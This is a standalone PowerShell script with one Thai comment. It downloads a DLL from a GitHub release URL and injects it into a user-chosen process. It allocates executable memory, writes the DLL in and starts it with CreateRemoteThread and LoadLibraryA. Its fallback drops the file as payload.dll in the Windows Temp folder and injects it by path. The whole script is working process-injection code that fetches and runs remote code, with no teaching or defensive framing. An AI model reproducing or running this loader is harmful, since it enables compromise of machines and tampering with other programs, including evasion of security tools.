$dllUrl = "https://github.com/newgen319/xxx_x1/releases/download/v1.0/xxx_x1_x64.dll"

Write-Host "Enter PID : " -NoNewline
$targetPid = [int](Read-Host)

$proc = Get-Process -Id $targetPid -ErrorAction SilentlyContinue
if (-not $proc) { Write-Host "Process not found!"; exit }

Write-Host "Downloading DLL..."
$response = Invoke-WebRequest -Uri $dllUrl -UseBasicParsing -Headers @{"User-Agent"="Mozilla/5.0"}
$dllBytes = $response.Content
Write-Host "Downloaded $($dllBytes.Length) bytes"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Native {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int a, bool b, int c);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out UIntPtr w);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr sa, IntPtr p, uint c, IntPtr i);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr m, string n);
    [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr h, uint m);
    [DllImport("kernel32.dll")] public static extern bool GetExitCodeThread(IntPtr h, out uint c);
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string n);
}
"@

$hProcess = [Native]::OpenProcess(0x1F0FFF, $false, $targetPid)
if ($hProcess -eq 0) { Write-Host "OpenProcess failed!"; Read-Host; exit }

$remoteBuffer = [Native]::VirtualAllocEx($hProcess, 0, $dllBytes.Length + 0x1000, 0x3000, 0x40)
$bytesWritten = [UIntPtr]::Zero
[Native]::WriteProcessMemory($hProcess, $remoteBuffer, $dllBytes, $dllBytes.Length, [ref]$bytesWritten)

$kernel32 = [Native]::GetProcAddress([Native]::LoadLibrary("kernel32.dll"), "LoadLibraryA")
$threadHandle = [Native]::CreateRemoteThread($hProcess, 0, 0, $kernel32, $remoteBuffer, 0, 0)

if ($threadHandle -eq 0) {
    Write-Host "CreateRemoteThread failed"
} else {
    [Native]::WaitForSingleObject($threadHandle, 5000)
    $exitCode = 0
    [Native]::GetExitCodeThread($threadHandle, [ref]$exitCode)
    if ($exitCode -eq 0) {
        Write-Host "LoadLibrary FAILED - Trying alternative method..." -ForegroundColor Yellow
        
        # วิธีที่ 2: เขียน DLL ลง disk แล้ว LoadLibrary ด้วย path
        $tempPath = "C:\Windows\Temp\payload.dll"
        [System.IO.File]::WriteAllBytes($tempPath, $dllBytes)
        
        $pathBytes = [System.Text.Encoding]::ASCII.GetBytes($tempPath)
        $pathBuffer = [Native]::VirtualAllocEx($hProcess, 0, $pathBytes.Length, 0x3000, 0x04)
        [Native]::WriteProcessMemory($hProcess, $pathBuffer, $pathBytes, $pathBytes.Length, [ref]$bytesWritten)
        
        $threadHandle2 = [Native]::CreateRemoteThread($hProcess, 0, 0, $kernel32, $pathBuffer, 0, 0)
        [Native]::WaitForSingleObject($threadHandle2, 5000)
        [Native]::GetExitCodeThread($threadHandle2, [ref]$exitCode)
        
        if ($exitCode -eq 0) {
            Write-Host "Still FAILED" -ForegroundColor Red
        } else {
            Write-Host "SUCCESS with path!" -ForegroundColor Green
        }
        [Native]::CloseHandle($threadHandle2)
    } else {
        Write-Host "LoadLibrary SUCCESS!" -ForegroundColor Green
    }
    [Native]::CloseHandle($threadHandle)
}

[Native]::CloseHandle($hProcess)
Write-Host "Done"
Read-Host "Press Enter"
